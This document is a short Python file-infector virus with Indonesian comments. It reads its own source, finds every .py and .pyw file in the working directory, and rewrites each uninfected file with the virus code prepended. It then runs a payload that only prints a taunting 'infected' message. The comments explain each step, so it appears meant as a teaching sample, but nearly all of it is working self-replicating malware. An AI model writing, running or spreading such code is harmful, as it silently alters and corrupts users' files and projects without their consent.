# VIRUS SAYS HI!

import sys         # Untuk mengambil argumen baris perintah, khususnya nama file ini sendiri
import glob        # Untuk mencari semua file dengan ekstensi tertentu (di sini: .py dan .pyw)

virus_code = []    # List kosong untuk menyimpan bagian kode virus

# Membaca isi file skrip ini sendiri
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False   # Flag untuk mulai menyalin bagian virus
for line in lines:
    if line == "# VIRUS SAYS HI!":       # Saat menemukan tanda awal virus
        self_replicating_part = True
    if not self_replicating_part:        # Menyalin semua baris sebelum bagian virus
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":    # Saat menemukan tanda akhir virus, berhenti salin
        break

# Mencari semua file Python di direktori (yang bisa diinfeksi)
python_files = glob.glob('*.py') + glob.glob('*.pyw')

# Loop untuk tiap file Python
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False   # Asumsikan belum terinfeksi

    # Cek apakah file sudah mengandung tanda virus
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    # Jika belum terinfeksi, gabungkan kode virus + kode asli
    if not infected:
        final_code = []
        final_code.extend(virus_code)    # Tambahkan kode virus
        final_code.extend('\n')          # Tambahkan baris kosong
        final_code.extend(file_code)     # Tambahkan kode asli

        # Tulis ulang file dengan kode gabungan
        with open(file, 'w') as f:
            f.writelines(final_code)

# Payload: Kode berbahaya yang dijalankan setelah infeksi
def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")  # Tindakan jahat (di sini hanya print)

malicious_code()  # Menjalankan payload

# VIRUS SAYS BYE!
